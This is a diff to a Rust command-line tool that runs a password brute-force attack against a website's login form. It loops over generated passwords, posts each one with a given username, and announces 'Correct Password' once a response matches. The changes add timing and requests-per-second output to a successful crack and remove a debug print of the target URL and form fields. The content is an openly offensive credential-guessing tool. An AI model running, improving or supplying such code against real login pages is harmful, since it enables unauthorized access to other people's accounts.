@@ -29,8 +29,10 @@ async fn sending_requests(
     let username_field = std::sync::Arc::new(username_field);
     let password_field = std::sync::Arc::new(password_field);
     let error_message = std::sync::Arc::new(error_message);
-    let mut request_amount = 0;
+
     let mut tasks = Vec::new();
+    let mut request_amount = 0;
+    let start_time = std::time::Instant::now();
 
     for password in password_generator() {
         request_amount += 1;
@@ -55,6 +57,8 @@ async fn sending_requests(
                     Ok(resp) => match resp.text().await {
                         Ok(text) => {
                             if text.contains(&**error_message) {
+                                println!("{}", "-".repeat(50));
+
                                 println!(
                                     "[{}] Correct Password: '{}'",
                                     Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
@@ -64,7 +68,13 @@ async fn sending_requests(
                                 println!(
                                     "[{}] Request Amount: {}",
                                     Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
-                                    request_amount,
+                                    request_amount.clone(),
+                                );
+
+                                println!(
+                                    "[{}] Request Per Second: {:.3}",
+                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+                                    request_amount as f64 / start_time.elapsed().as_secs_f64(),
                                 );
                                 std::process::exit(1);
                             }
@@ -147,11 +157,6 @@ async fn main() {
     println!(
         "[{}] Starting Brute Force Attack",
         Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
-    );
-
-    println!(
-        "{} {} {} {} {}",
-        website_url, username, username_field, password_field, error_message
     );
 
     sending_requests(
